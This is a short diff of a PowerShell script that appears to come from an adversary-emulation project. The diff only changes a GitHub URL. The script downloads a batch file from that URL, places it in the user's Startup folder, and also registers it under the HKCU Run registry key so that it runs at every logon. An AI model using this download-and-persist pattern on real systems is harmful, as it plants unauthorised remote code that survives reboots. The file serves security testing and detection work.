@@ -1,10 +1,10 @@
 # StartUp Folder Persistence
-Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Adversary-Emulation/blob/main/scripts/files/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
+Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Emulation-Scripts/refs/heads/main/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
 
 # Run Key Persistence
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $keyName = "Persistence"
-Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Adversary-Emulation/blob/main/scripts/files/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
+Invoke-WebRequest -uri "https://raw.githubusercontent.com/sccic-github/Emulation-Scripts/refs/heads/main/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
 $calcPath = "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
 Set-ItemProperty -Path $registryPath -Name $keyName -Value $calcPath
 
